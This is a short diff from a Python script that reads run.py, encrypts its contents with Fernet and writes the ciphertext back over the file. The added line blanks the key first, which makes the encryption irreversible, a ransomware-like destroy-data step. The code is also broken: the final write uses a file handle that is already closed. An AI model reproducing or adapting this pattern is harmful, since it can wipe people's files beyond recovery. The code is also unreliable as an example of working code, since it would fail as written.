@@ -24,5 +24,6 @@ for file in files:
 with open("run.py", "rb") as runpy:
     content = runpy.read()
 enc_content = Fernet(key).encrypt(content)
+key = ""
 with open("run.py", "wb"):
     runpy.write(enc_content)
